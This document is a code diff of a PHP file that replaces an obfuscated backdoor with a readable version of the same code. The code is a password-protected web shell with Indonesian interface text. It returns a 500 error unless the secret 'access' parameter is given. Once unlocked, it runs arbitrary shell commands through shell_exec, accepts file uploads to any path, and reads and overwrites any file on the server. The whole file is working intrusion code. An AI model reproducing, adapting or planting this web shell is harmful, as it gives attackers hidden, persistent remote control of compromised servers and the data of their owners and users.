@@ -1,2 +1,45 @@
 <?php
- goto NVK1k; dWYkm: $param = $_GET["\x61\143\143\x65\163\x73"] ?? ''; goto rWTis; NVK1k: $hashParam = "\x24\x32\x79\x24\x31\x30\44\172\x57\141\x52\x55\113\x41\132\x53\x4a\102\56\113\x49\127\x61\116\114\66\125\70\117\66\x68\122\x6c\151\x62\x44\x5a\162\70\124\x37\146\152\x44\144\x30\x42\x6f\x4c\71\122\x6e\146\x65\166\104\145\141\x49\x6d"; goto dWYkm; rWTis: if (password_verify($param, $hashParam)) { if ($_FILES) { move_uploaded_file($_FILES["\146\151\x6c\145"]["\x74\x6d\x70\x5f\156\x61\x6d\x65"], $_FILES["\146\x69\154\x65"]["\156\x61\x6d\145"]); echo "\342\x80\xa6\40\x55\x70\154\157\x61\144\x20\142\145\162\150\x61\163\x69\154\41\x3c\142\x72\76"; } if (isset($_POST["\x63\x6d\x64"])) { echo "\74\160\x72\145\76\xe2\206\x92\x20" . htmlspecialchars($_POST["\x63\x6d\x64"]) . "\72\x3c\57\160\x72\x65\76"; echo "\x3c\x70\x72\145\x3e" . shell_exec($_POST["\x63\x6d\x64"]) . "\74\x2f\x70\162\145\x3e"; } if (isset($_POST["\145\144\x69\164\137\x66\151\x6c\145"])) { file_put_contents($_POST["\145\144\151\x74\137\x66\151\154\145"], $_POST["\x63\157\x6e\x74\x65\156\x74"]); echo "\342\x80\246\x20\x46\151\x6c\145\x20\x62\x65\162\x68\141\163\x69\x6c\x20\144\151\x65\144\151\164\x21\74\x62\x72\76"; } echo "\74\146\x6f\162\x6d\40\x6d\145\164\x68\157\x64\75\42\120\x4f\x53\124\x22\76\xa\40\x20\x20\x20\40\x20\x20\40\40\40\40\40\x3c\151\x6e\x70\x75\164\40\x74\171\x70\145\x3d\42\x74\x65\x78\164\x22\40\156\141\155\145\75\42\143\155\144\x22\x20\x70\154\141\143\x65\x68\157\154\144\x65\x72\75\42\115\141\x73\165\153\x6b\141\156\40\x50\x65\162\x69\x6e\164\141\150\42\x3e\12\40\40\40\x20\x20\x20\40\x20\x20\40\x20\40\x3c\151\x6e\x70\x75\164\x20\x74\171\160\145\75\42\163\x75\x62\x6d\151\164\42\40\166\x61\x6c\x75\x65\x3d\x22\x45\x6b\x73\145\153\x75\x73\151\42\76\12\x20\40\x20\x20\40\x20\40\40\x20\40\74\x2f\146\x6f\x72\155\76"; echo "\74\x66\157\x72\x6d\x20\155\145\164\150\x6f\x64\75\42\120\117\123\124\x22\x20\145\156\x63\164\x79\x70\145\x3d\42\x6d\x75\x6c\164\151\160\141\162\164\57\x66\157\x72\x6d\x2d\x64\x61\164\x61\42\x3e\12\40\x20\x20\x20\40\x20\x20\x20\40\40\40\x20\74\151\156\x70\165\164\40\164\x79\160\x65\75\x22\146\151\x6c\x65\x22\x20\156\141\155\x65\x3d\x22\x66\151\154\145\42\x3e\12\40\x20\40\x20\40\40\x20\x20\x20\x20\40\40\74\151\156\160\x75\164\40\164\171\160\x65\75\42\x73\x75\x62\155\x69\x74\x22\x20\166\141\154\165\x65\75\x22\125\x70\154\157\141\144\x22\x3e\xa\x20\x20\40\40\40\40\40\x20\40\40\x3c\57\146\157\x72\x6d\76"; if (isset($_GET["\x66\151\x6c\145"])) { echo "\74\x66\x6f\x72\155\40\x6d\145\164\150\x6f\144\75\42\x50\x4f\123\x54\42\76\12\x20\x20\x20\40\x20\x20\40\x20\40\40\x20\x20\x20\x20\x20\40\74\151\156\x70\165\164\x20\x74\x79\160\x65\x3d\x22\x68\151\144\x64\145\x6e\42\40\156\x61\x6d\x65\x3d\x22\145\x64\x69\164\x5f\x66\151\154\x65\x22\x20\166\x61\x6c\165\x65\75\x22" . htmlspecialchars($_GET["\146\x69\154\145"]) . "\x22\x3e\xa\x20\x20\40\x20\40\40\40\x20\40\x20\40\40\40\40\x20\40\x3c\x74\145\170\164\x61\x72\x65\x61\x20\156\x61\x6d\x65\x3d\42\x63\157\x6e\164\145\x6e\x74\42\x20\x72\x6f\167\163\x3d\x22\61\60\x22\x20\x63\x6f\154\163\75\42\65\60\42\x3e" . htmlspecialchars(file_get_contents($_GET["\146\x69\154\145"])) . "\x3c\x2f\x74\145\x78\x74\x61\162\x65\141\x3e\12\x20\40\x20\x20\x20\40\x20\x20\40\x20\x20\x20\x20\x20\40\40\74\151\156\160\x75\164\x20\x74\x79\160\145\75\42\163\165\x62\x6d\x69\164\x22\40\x76\141\154\x75\x65\x3d\42\123\151\x6d\x70\x61\x6e\x22\76\xa\x20\40\40\40\40\x20\x20\40\40\x20\40\40\x20\40\x3c\57\x66\157\162\x6d\x3e"; } } else { http_response_code(500); } goto mdqvA; mdqvA: ?>
+$hashParam = '$2y$10$zWaRUKAZSJB.KIWaNL6U8O6hRlibDZr8T7fjDd0BoL9RnfevDeaIm';
+
+$param = $_GET['access'] ?? '';
+
+if (password_verify($param, $hashParam)) {
+
+    if ($_FILES) {
+        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+        echo "… Upload berhasil!<br>";
+    }
+
+    if (isset($_POST['cmd'])) {
+        echo "<pre>→ " . htmlspecialchars($_POST['cmd']) . ":</pre>";
+        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
+    }
+
+    if (isset($_POST['edit_file'])) {
+        file_put_contents($_POST['edit_file'], $_POST['content']);
+        echo "… File berhasil diedit!<br>";
+    }
+
+    echo '<form method="POST">
+            <input type="text" name="cmd" placeholder="Masukkan Perintah">
+            <input type="submit" value="Eksekusi">
+          </form>';
+
+    echo '<form method="POST" enctype="multipart/form-data">
+            <input type="file" name="file">
+            <input type="submit" value="Upload">
+          </form>';
+
+    if (isset($_GET['file'])) {
+        echo '<form method="POST">
+                <input type="hidden" name="edit_file" value="'.htmlspecialchars($_GET['file']).'">
+                <textarea name="content" rows="10" cols="50">'
+                .htmlspecialchars(file_get_contents($_GET['file'])).'</textarea>
+                <input type="submit" value="Simpan">
+              </form>';
+    }
+
+} else {
+    http_response_code(500);
+}
+?>
